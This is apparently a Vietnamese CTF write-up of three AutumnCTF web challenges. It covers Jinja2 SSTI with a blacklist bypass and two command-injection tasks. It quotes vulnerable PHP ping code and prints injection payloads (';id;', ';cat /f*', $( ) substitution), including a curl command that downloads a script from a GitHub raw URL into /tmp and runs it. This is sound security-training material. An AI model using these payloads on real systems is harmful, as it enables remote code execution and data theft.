---
title: AutumnCTF ISP Write-up
date: 2022-08-10
categories: [writeup]
tags: [web]
---
# AutumnCTF ISP

# Hello my fen

Sau khi đọc source và biết được backend là flask jinja 2 thì có thể đoán luôn được là bài này bị dính SSTI, giờ tìm cách bypass black list và white list của bài thôi.

Lên payload all the things chọn một payload thuộc phần read remote file: 

![Untitled](/assets/img/img-wu/AutumnCTFISP/Untitled%2011.png)

Sửa file `/etc/passwd` thành `[app.py](http://app.py)` để đọc thử thì thấy kết quả trả về đúng là nội dung file. Giờ thì sẽ làm sao để có thể in ra được nội dung của file `flag.txt`  vì từ `flag` đã nằm trong blacklist

![Untitled](/assets/img/img-wu/AutumnCTFISP/Untitled.png)

Đến đây thì ta phải dùng hàm `join()` của python để nối chuỗi lại với nhau tạo thành tên file `flag.txt`.

Payload: 

![Untitled](/assets/img/img-wu/AutumnCTFISP/Untitled%2012.png)

Flag: **`FLAG{did-you-really-understand-ssti??}`**

# Ping service v1

Chức năng của website sẽ là nhập một địa chỉ ip rồi sẽ chạy lệnh ping đến địa chỉ ip đó

![Untitled](/assets/img/img-wu/AutumnCTFISP/Untitled%201.png)

⇒ liên quan đến Command Injection

Ctrl+U lên để check source thì thấy có ?debug, vào check source nào

```php
<?php
if (isset($_GET['debug'])) {
    die(show_source(__FILE__));
}
if (isset($_GET['addr'])) {
    $addr = $_GET['addr'];
    $addr = preg_replace('/\||&|;|`|{|}|"|\'|cat|tail|>|<|\n/', ' ', $addr);
    $cmd = 'ping -c 2 ' . $addr . ' 2>&1';
    $ans = shell_exec($cmd);
    $ans = '<h3>' . preg_replace('/\r|\n/', '<br/>', $ans) . '</h3>';
}
```

Bên trên là đoạn code cần chú ý, phía backend sẽ dùng hàm `preg_replace()` để filter input mà người dùng nhập vào. Nhưng ở đây ta có thể dùng câu lệnh ví dụ như `$(pwd)` để bypass filter này.

![Untitled](/assets/img/img-wu/AutumnCTFISP/Untitled%202.png)

Hướng làm bây giờ sẽ là up 1 file bất kì có chứa nội dung là `cat /flag` trên nền tảng github. Sau đó dùng lệnh `curl` để tải file về phía server. Phải thay đổi vị trí tải file vị trí folder hiện tại `/var/www/html` sẽ không cho phép tạo thêm file

Tạo file trên github

![Untitled](/assets/img/img-wu/AutumnCTFISP/Untitled%203.png)

Sau đó vào phần raw, copy url.

Lệnh `curl` cần dùng:

```php
$(curl https://raw.githubusercontent.com/kmaron1n/temp/main/a.txt -o /tmp/a)
```

câu lệnh trên sẽ gán nội dung của file a.txt vào file mới tạo là `/tmp/a` 

Check xem folder `/tmp` đã có file a chưa:

![Untitled](/assets/img/img-wu/AutumnCTFISP/Untitled%204.png)

OK!

Giờ thì chạy file `a` rồi lấy flag thôi

![Untitled](/assets/img/img-wu/AutumnCTFISP/Untitled%205.png)

Flag: **`FLAG{not-show-stdout-when-r-stupid}`**

# Git checker

Khi truy cập vào đường dẫn ta sẽ được giao diện như sau. 

![Untitled](/assets/img/img-wu/AutumnCTFISP/Untitled%206.png)

Chức năng của website sẽ là chạy lệnh git. CHo chạy qua proxy burpsuite bắt requests, ta thấy command sẽ được truyền tới server dưới dạng JSON

![Untitled](/assets/img/img-wu/AutumnCTFISP/Untitled%207.png)

Param `args` thay đổi được, có vẻ bài này sẽ khai thác được bằng lỗi Command Injection.

Thử thay giá trị của `args` bằng một số payload, ví dụ: `;id;` ⇒ payload hoạt động

![Untitled](/assets/img/img-wu/AutumnCTFISP/Untitled%208.png)

Thử tìm xem có file flag ở đây không bằng payload `;ls` ,  flag nằm cùng thư mục luôn.

![Untitled](/assets/img/img-wu/AutumnCTFISP/Untitled%209.png)

Dùng payload `;cat /f*` được Flag

![Untitled](/assets/img/img-wu/AutumnCTFISP/Untitled%2010.png)

Flag: `FLAG{g1t-c0mm4nd_1sn't_s4f333}`